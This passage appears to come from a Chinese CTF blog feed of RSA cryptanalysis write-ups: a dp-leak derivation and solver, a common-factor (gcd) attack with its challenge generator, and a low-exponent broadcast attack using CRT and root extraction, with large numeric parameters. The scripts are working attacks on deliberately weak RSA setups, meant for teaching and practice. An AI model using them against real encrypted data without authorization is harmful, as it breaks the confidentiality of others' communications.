number">11917967705200196530423914441613144297148147672566202863977167024519218321836386637302409557947445841293888462405994683655441879000427977086221906497225533946193332303182079068462781262341197088906792898634398410298474823088739257515556595214077227746604247505450334512424047100626106474291190033258919062850451435841454816600402372026810570127115167968899329724894556092798669018218440148846597174016217159034241427361756697433952800424383010684502324285145303400856470193420837017178412747680690628590204528459258189973779463979907863227915782407651254796209362605706066438960631045833533860845111845422613428738602</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">65535</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token operator">=</span><span class="token punctuation">(</span>dp<span class="token operator">*</span>e<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span>i<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">if</span> n<span class="token operator">%</span>p<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        q<span class="token operator">=</span>n<span class="token operator">//</span>p        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span>phi_n<span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag<span class="token operator">=</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/01/14/dp%E6%B3%84%E9%9C%B2/MyBlog\source_posts\dp泄露.assets\1665237014708.png" alt="1665237014708"></p><h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><pre class="line-numbers language-none"><code class="language-none">已知：c &#x3D; m^e mod nm &#x3D; c^d mod nϕ(n)&#x3D;(p−1)*(q−1)d∗e ≡ 1 mod ϕ(n)dp &#x3D; d mod (p−1)由上式可以得到dp*e≡d*e mod (p−1)因此可以得到式1：d∗e&#x3D;k∗(p−1)+dp∗e式2：d∗e≡1 mod ϕ(n)式1带入式2&#x3D;&gt; k∗(p−1)+dp∗e ≡1 mod ϕ(n)&#x3D;&gt; k∗(p−1)+dp∗e ≡1 mod (p−1)∗(q−1)&#x3D;&gt; k1∗(p−1)+dp∗e &#x3D; k2*(p−1)∗(q−1)+1&#x3D;&gt; dp*e &#x3D;  k2*(p−1)∗(q−1)+1-k1∗(p−1)+dp∗e&#x3D;&gt; dp*e &#x3D; (p-1)*[k2*(p-1)-k1]+1因dp&lt;p−1（dp是d&#x2F;&#x2F;（p-1）的余数，dp&lt;p−1）所以e &gt; k2∗(q−1)−k1假设 x&#x3D;k2∗(q−1)−k1x的范围为 (0,e)x∗(p−1)+1&#x3D;dp∗e求出p-1方法，遍历(0,e)的范围，其中肯定有一个p可以被n整除，那么求出p和q <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N不互素</title>
      <link href="/2023/01/14/N%E4%B8%8D%E4%BA%92%E7%B4%A0/"/>
      <url>/2023/01/14/N%E4%B8%8D%E4%BA%92%E7%B4%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="出题脚本1："><a href="#出题脚本1：" class="headerlink" title="出题脚本1："></a>出题脚本1：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token comment">#生成随机素数</span>p1<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>p2<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>q<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>e<span class="token operator">=</span><span class="token number">65537</span>m<span class="token operator">=</span><span class="token string">"flag&#123;c9d48baa792e91ce65d175bb586f8c24&#125;"</span><span class="token comment">#字符串转数字</span>m<span class="token operator">=</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span>n1<span class="token operator">=</span>p1<span class="token operator">*</span>qn2<span class="token operator">=</span>p2<span class="token operator">*</span>q<span class="token comment">#求逆元</span>c1<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n1<span class="token punctuation">)</span>c2<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n2<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"e="</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n1="</span><span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n2="</span><span class="token punctuation">,</span>n2<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"c1="</span><span class="token punctuation">,</span>c1<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"c2="</span><span class="token punctuation">,</span>c2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/01/14/N%E4%B8%8D%E4%BA%92%E7%B4%A0/MyBlog\source_posts\N不互素.assets\1665228838428.png" alt="1665228838428"></p><h3 id="解题脚本："><a href="#解题脚本：" class="headerlink" title="解题脚本："></a>解题脚本：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2e<span class="token operator">=</span> <span class="token number">65537</span>n1<span class="token operator">=</span> <span class="token number">18851781425565649500243914718895527060598553785142033499277947796047289729069551538151421839511239897691881228121437622923274745439286192958624933347473814433650645821240330239352230328910532686189064529002598986350545013596873280380093139589440286483854335646063005690269032198568724965964443111093291700142910652223408636268615176273268372177721667944316123253596652992256076572634227395015036348109972259736684061785035583511127926569341967394058493301139935304361924639075754092181040235419401702148068770694697982444290753353433701503833775179671108406498799549700127209151389161427718168658930877516526900193773</span>n2<span class="token operator">=</span> <span class="token number">24141384186719901100738328229558939321137195844627407412035205930880546126459260897433418685279927024995699136588216700770429628894224051287181657357533218989737870319139269421990248988961435374202640406264110282763206906390508271179764960952342404379846442988489435158217691170804372863828966379599925114485971708200189788312061335938149982724447336254731731196164294152411281627551943972751739099703406466680639123738668207648503911709799873188331259979032169198913999856215096219340617703116234922400948884716827963616800355410477122406692338452507358998811789750057925245184372948089354754021196407808558611706347</span>c1<span class="token operator">=</span> <span class="token number">11233930138929485738604185458820792679941706517184575056860307907280050814616639358486313129298273947905894904145194035804995663173314907762677924041275132974029028894644172713486633713023630611556983846927634063704894533048653309657581762974450289360550659261899944333557732087882069544235529266455787027619668939220511057340231613645208599303911724024926701608537602920797245075262273603379467945283128416767718651714209330369788240996832207630345743245279821753430782200336283582459635492184924556145031704499178500242816865275291936063430100028447772122941596704727728675661250380470986371668037469383671505328135</span>c2<span class="token operator">=</span> <span class="token number">5585224206647236865248808202221713289466135149339680308821203835812670001259895780508640505222648200259525489427033258746992319005320440650548405653844536422632581252608192223771882550003217335273112474383014796651892287737753603533030776710121680439078567046997872719450037145665867123925472406058893384600128119493338790196284996386511009366274826447064392594100457497289556291407982935292829015102796178711091471748295065093460144885719356062242014650190112796869173536886083200906303200902844575328314123662659807283984619970501020349836850699532193026247740142876327310689901499496665093919484517214474842110431</span><span class="token comment">#求最大公约数</span>q<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">)</span>p1<span class="token operator">=</span>n1<span class="token operator">//</span>qphi_n<span class="token operator">=</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>p1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#求逆元d</span>d1<span class="token operator">=</span>libnum<span class="token punctuation">.</span>invmod<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi_n<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>d1<span class="token punctuation">,</span>n1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token comment">#数字转字节，转字符串</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> RSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>低指加密广播攻击</title>
      <link href="/2023/01/14/%E4%BD%8E%E6%8C%87%E5%8A%A0%E5%AF%86%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/"/>
      <url>/2023/01/14/%E4%BD%8E%E6%8C%87%E5%8A%A0%E5%AF%86%E5%B9%BF%E6%92%AD%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h3 id="出题脚本："><a href="#出题脚本：" class="headerlink" title="出题脚本："></a>出题脚本：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token comment">#生成随机素数</span><span class="token keyword">def</span> <span class="token function">rsa_def</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    q<span class="token operator">=</span>libnum<span class="token punctuation">.</span>generate_prime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token comment">#字符串转数字</span>    m<span class="token operator">=</span>libnum<span class="token punctuation">.</span>s2n<span class="token punctuation">(</span>m<span class="token punctuation">)</span>    n<span class="token operator">=</span>p<span class="token operator">*</span>q    c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    n_lt<span class="token punctuation">.</span>append<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    c_lt<span class="token punctuation">.</span>append<span class="token punctuation">(</span>c<span class="token punctuation">)</span>n_lt<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>c_lt<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">23</span>m<span class="token operator">=</span><span class="token string">'flag&#123;2cb2eb4b2c7fdf4e94e10344be856446&#125;'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    rsa_def<span class="token punctuation">(</span>e<span class="token punctuation">,</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e="</span><span class="token punctuation">,</span>e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n="</span><span class="token punctuation">,</span>n_lt<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c="</span><span class="token punctuation">,</span>c_lt<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解密脚本1："><a href="#解密脚本1：" class="headerlink" title="解密脚本1："></a>解密脚本1：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert<span class="token punctuation">,</span> gcd<span class="token punctuation">,</span> iroot<span class="token keyword">def</span> <span class="token function">op</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">:</span>        res <span class="token operator">*=</span> i    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">CRT</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>    M <span class="token operator">=</span> op<span class="token punctuation">(</span>m<span class="token punctuation">)</span>    <span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> m<span class="token punctuation">,</span> a <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>        Mi <span class="token operator">=</span> M <span class="token operator">//</span> m        ti <span class="token operator">=</span> invert<span class="token punctuation">(</span>Mi<span class="token punctuation">,</span> m<span class="token punctuation">)</span>        <span class="token builtin">sum</span> <span class="token operator">+=</span> a <span class="token operator">*</span> ti <span class="token operator">*</span> Mi    <span class="token keyword">return</span> <span class="token builtin">sum</span> <span class="token operator">%</span> M<span class="token keyword">def</span> <span class="token function">GCRT</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>    curm<span class="token punctuation">,</span> cura <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> m<span class="token punctuation">,</span> a <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        d <span class="token operator">=</span> gcd<span class="token punctuation">(</span>curm<span class="token punctuation">,</span> m<span class="token punctuation">)</span>        c <span class="token operator">=</span> a <span class="token operator">-</span> cura        <span class="token keyword">assert</span> <span class="token punctuation">(</span>c <span class="token operator">%</span> d <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        K <span class="token operator">=</span> c <span class="token operator">//</span> d <span class="token operator">*</span> invert<span class="token punctuation">(</span>curm <span class="token operator">//</span> d<span class="token punctuation">,</span> m <span class="token operator">//</span> d<span class="token punctuation">)</span>        cura <span class="token operator">+=</span> curm <span class="token operator">*</span> K        curm <span class="token operator">=</span> curm <span class="token operator">*</span> m <span class="token operator">//</span> d    <span class="token keyword">return</span> cura <span class="token operator">%</span> curme<span class="token operator">=</span> <span class="token number">23</span>n<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">13700568188515160652483333122748856122721197793561758976293940196437611129096187147049018844770801852491509905633421086860525538786202094426963328030251710764571262136174896745533638173611350459716214924297588461960177050085385463667053134112771796358074472935345700519739991250404101653259068109069693105921388873407341327391535695855870048544246046807524271999074571290297887397122751189238913097314211648891658786959026354758174645247220351373112768023740548658853638361571194694899655444114676642455442372865402013423716810043521278757792135057542028337381224680456644807085272591758332208055210218120184762933993</span><span class="token punctuation">,</span> <span class="token number">12455303951778295101801876746865726762837380068225611327265475119171234220566439286424157465915935073825839673377690927685328334906307316474567186387631653801487281448621083840044622749158794717243547992072439308091388396577613505544620596436291129920864908674330398567591089739953054198863265589615640925745448938637009162522951734388734884333210018733280942210441939903191498896601489219385238879930891399742641138070096026008226581854996694584005317481033177457738077410685570860098544905752983525186623046625831970650060102227916725290755005373441583687173317035035580381484364030548806838563780182184117638395501</span><span class="token punctuation">,</span> <span class="token number">11312913453345524997229175092303757066349809787030135927591246090443816441487008566337534259925791562593802909853876625626317525202428762422138834267165059103366474521447755350822619474026723784588743249816343322663039545930277057837056152601616900790058365628051926865192020616084647924562898079954569875871488048485269581903324695594743584490301132714735102846843035514174635115834382345956826120332925240425711055383445735314612014526078453624636064136731525847521062469732411461240879728208804879621960486763810048962817360272134393185930002946977732438576414921250013379633385546522773969341316069572502067565747</span><span class="token punctuation">,</span> <span class="token number">19273688926871530751707885170718573691217157450567879434223457628340410073625895093788197974441685806302563195850728310991029886375715086122432340760177266985524985445504300034480827487797904941865418089597333968798898696588493471468263648636085443020434703464184815215924633364352735339920297191301112596913193981943417483120540953061378442416926357165828400001655707467493126093621482473840789855669296212432210460828627914111587469312179918093681028472281824867507358588256781382024745011058883359327063772375423890907634909474243733397473408057822868275644578237140525612613960087777442779675214209932962161127943</span><span class="token punctuation">,</span> <span class="token number">25824403380218842654152117237181863815407686057920357548100132783016208234216157331481187013858706620084532009147859360032194662194329147430352381352060599665383607132414222783152103706812942495504805443853663820643284400132519740763181995336671760074736189118849190911417412125673622718186682930944463719251663826122062414169185281402187745799450127860616811214434583738617470847946117017912241156196170781549212311773302997289690360334428053433645188479934679156573770259457673448241437007751122166255146634172359683608410225806629185780976706769275891277564054509652711969428966369382807140328871035548244913540169</span><span class="token punctuation">,</span> <span class="token number">27237916069051621208940446912652352983034283876768722877796629630339066194659652050347720419800886409125794947519574028544026594230991606608793723513349031053967598250588096756917851047427400805606694825815650771281434785207392911507124225263256982256339868047939184615897450178154018301408865653899046967323372600912627209194957697714349971037547547785817038582309482843956504640495722872808769284795831606211370129997371039857944461416328980185572754574947986464294124047090215456723501364524474569642506285260702179251484768225200095243277847312804129809104143492271538375785121251371642879445405237226218130294767</span><span class="token punctuation">,</span> <span class="token number">13761550682262178277138207445908812895938004012620351458812077456012342912081457948142730381037941264721223863482179216010551793547021574285408780459622610402725800322968427850107196669966179328339837806343597136218927944640487794959105652921590477743490006234776475206318254765423468761009179359533340573903819987444132938579714590504929528901380380034611797641640102025769022580055379262631658712636898183456153010636153333354330556615811465638688432337372481631547224635135648075131524783033767896216049834072882777559679890752875405582498757130694817571975439400501682753249614034942783158191876673449277964305873</span><span class="token punctuation">]</span>c<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10262571808823462518706222972617543597862568988621892788603169566061143066015712397590162941689759961146172690260488971865965270847230222579998032904557938430984766267711048364907947168116473908091952262274847901197798670702630932509348193160049011343984674456154980133706472252009228877741952811774717803218313244040775956381945077497379634101671865923305021804060521682939202170177994307021066512676052755208342422597702905467231418454913781792876325613132181844091995047630699929420681514255787561417787538399764114936771546416271603555435195286433694761222982635917086486380929164535357220194188751490847126159740</span><span class="token punctuation">,</span> <span class="token number">1873760069623225193188031460164577168629510321843511590851589581010158323091884037245625334264450576423497513703748949943402486554235195486945608003604913492410550727032646952732075387833483434157962823847945961417788077590746865603009614636801926695485643494439910816287002493987681839263137321312158281577409606512588038571503481880205375876372759847610515728629030784895468324627007475548811579324164095761843942789779697129082973879068202809855392853491223029896314818656151121278599338954208895547796950391203204627158727359612310869523861493123901912234283765154942764948742461112728821107134608346552771856775</span><span class="token punctuation">,</span> <span class="token number">2985895977894993412250356564280621188757701877004747248029655606908178453788442472530624315824217412687521627124641549636268771426175593603860596969406918746968428475480360839574070154578348252212233965555420185919910549233104881737429986120779245582625147836249604511991694099504498456423355415033891952572068957140136031237587821914297743550751703500164233251775829591163214908665505948671743637428615178406048668071123208829673815143306105215918457316827849469724561259085924020618664008688924504157202910867055508798021785392339533763892777711399815389010578953671416118696256122691527492893238690603105740871718</span><span class="token punctuation">,</span> <span class="token number">880226958648330570665826652923585021064905285913220564535802601268914731939998238851663053132946194395728683681709691206818341165883097568804208974913295560837751365921375933221025439628586836402981502674560586284377581275819082460923772292780487491196858992362166740159608419089452540222602172839570711702715638458570267373629408280794214751990345330692342439212475521544906222647038911039746667297765160642325197077286500302972512842670715220866427191331087678451078964988930072707946282911276517877581001397844626280393814317485128907214187598723285030652543787338988559227984102314239323999288888886062656553567</span><span class="token punctuation">,</span> <span class="token number">2009815427590067013904234705045801411676517862085803426907991060580056876965631979890272588810800230952582542504850877216565503823555945840629024122371840947339558621619080946766065959900677138148030357494710396126783369878070540451138925897438184723977799391715647904517833046633527545658064968373331747651285453005992951298693244135497529999014011663505125408546171884008627711191184419674138689402575260876247393334319284308455639799976027283117878360299913911527890869762030625362974305707352360014964055595635315501016094747111266795155708691399809263809612237731990725856751947329733607523318847566974421507377</span><span class="token punctuation">,</span> <span class="token number">5694700766209667533320463555578774304413921444532095100497641465531621818677278187178007777107102216001903166590706266461389108866563137126658591265596096815630888192401258893389043674230339983362206002697721033273220169349689433933228398864735569502059227668658884754437859192804614688078126017106973898338983058467903273433629800893427045854677794419302456422469488313296020469202479512874455184512957276727018667852597050339727765639174070344434646695283305954814336208535975320481890216924783115781802398152316171967550392347431746885369490458690822632544727994467024208594657404613355215378203965583472028051158</span><span class="token punctuation">,</span> <span class="token number">10292024155412613173825075050556970628998306804602106049394871162726180325842644363271001627039660982320232377250177866906798633433125147372046294230795160430975886694419367570376173140902999001496377201160021928316891425794054040646925354276987039659647583093660753953920769021487949471906220620446860851971969844544591399518592683848757784465531598787547279741438244737906014906621222662915117890417807671575763023265920422409800110274912550502682376498609611973173660997965660328963204286476887664127188442751055758474381180365051193094521479396706496869721757475497142256079170254820437945136475911435012491537989</span><span class="token punctuation">]</span>m <span class="token operator">=</span> CRT<span class="token punctuation">(</span>n<span class="token punctuation">,</span> c<span class="token punctuation">)</span>m1 <span class="token operator">=</span> iroot<span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">)</span>  <span class="token comment"># 开e次方</span><span class="token keyword">print</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解密脚本2："><a href="#解密脚本2：" class="headerlink" title="解密脚本2："></a>解密脚本2：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token punctuation">,</span>gmpy2<span class="token keyword">from</span> functools <span class="token keyword">import</span> <span class="token builtin">reduce</span><span class="token keyword">import</span> libnum<span class="token keyword">def</span> <span class="token function">CRT</span><span class="token punctuation">(</span>mi<span class="token punctuation">,</span> ai<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">assert</span><span class="token punctuation">(</span><span class="token builtin">reduce</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">,</span>mi<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token punctuation">(</span><span class="token builtin">isinstance</span><span class="token punctuation">(</span>mi<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>ai<span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    M <span class="token operator">=</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token operator">*</span> y<span class="token punctuation">,</span> mi<span class="token punctuation">)</span>    ai_ti_Mi <span class="token operator">=</span> <span class="token punctuation">[</span>a <span class="token operator">*</span> <span class="token punctuation">(</span>M <span class="token operator">//</span> m<span class="token punctuation">)</span> <span class="token operator">*</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>M <span class="token operator">//</span> m<span class="token punctuation">,</span> m<span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>mi<span class="token punctuation">,</span> ai<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token builtin">reduce</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token operator">+</span> y<span class="token punctuation">,</span> ai_ti_Mi<span class="token punctuation">)</span> <span class="token operator">%</span> Me<span class="token operator">=</span> <span class="token number">23</span>n<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">13700568188515160652483333122748856122721197793561758976293940196437611129096187147049018844770801852491509905633421086860525538786202094426963328030251710764571262136174896745533638173611350459716214924297588461960177050085385463667053134112771796358074472935345700519739991250404101653259068109069693105921388873407341327391535695855870048544246046807524271999074571290297887397122751189238913097314211648891658786959026354758174645247220351373112768023740548658853638361571194694899655444114676642455442372865402013423716810043521278757792135057542028337381224680456644807085272591758332208055210218120184762933993</span><span class="token punctuation">,</span> <span class="token number">12455303951778295101801876746865726762837380068225611327265475119171234220566439286424157465915935073825839673377690927685328334906307316474567186387631653801487281448621083840044622749158794717243547992072439308091388396577613505544620596436291129920864908674330398567591089739953054198863265589615640925745448938637009162522951734388734884333210018733280942210441939903191498896601489219385238879930891399742641138070096026008226581854996694584005317481033177457738077410685570860098544905752983525186623046625831970650060102227916725290755005373441583687173317035035580381484364030548806838563780182184117638395501</span><span class="token punctuation">,</span> <span class="token number">11312913453345524997229175092303757066349809787030135927591246090443816441487008566337534259925791562593802909853876625626317525202428762422138834267165059103366474521447755350822619474026723784588743249816343322663039545930277057837056152601616900790058365628051926865192020616084647924562898079954569875871488048485269581903324695594743584490301132714735102846843035514174635115834382345956826120332925240425711055383445735314612014526078453624636064136731525847521062469732411461240879728208804879621960486763810048962817360272134393185930002946977732438576414921250013379633385546522773969341316069572502067565747</span><span class="token punctuation">,</span> <span class="token number">19273688926871530751707885170718573691217157450567879434223457628340410073625895093788197974441685806302563195850728310991029886375715086122432340760177266985524985445504300034480827487797904941865418089597333968798898696588493471468263648636085443020434703464184815215924633364352735339920297191301112596913193981943417483120540953061378442416926357165828400001655707467493126093621482473840789855669296212432210460828627914111587469312179918093681028472281824867507358588256781382024745011058883359327063772375423890907634909474243733397473408057822868275644578237140525612613960087777442779675214209932962161127943</span><span class="token punctuation">,</span> <span class="token 